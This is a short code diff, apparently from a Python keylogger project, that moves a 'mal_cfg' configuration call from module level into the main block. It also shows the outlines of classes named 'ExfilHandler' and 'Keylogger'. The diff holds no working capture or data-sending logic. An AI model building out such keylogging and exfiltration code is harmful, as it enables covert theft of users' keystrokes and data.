@@ -33,9 +33,6 @@ def cfg_factory(cfg):
     return local_cfg
 
 
-mal_cfg = cfg_factory(cfg)
-
-
 class ExfilHandler(logging.handlers.MemoryHandler):
 
     def __init__(self, **kwargs):
@@ -94,4 +91,4 @@ class Keylogger(object):
 
 
 if __name__ == '__main__':
-    pass
+    mal_cfg = cfg_factory(cfg)
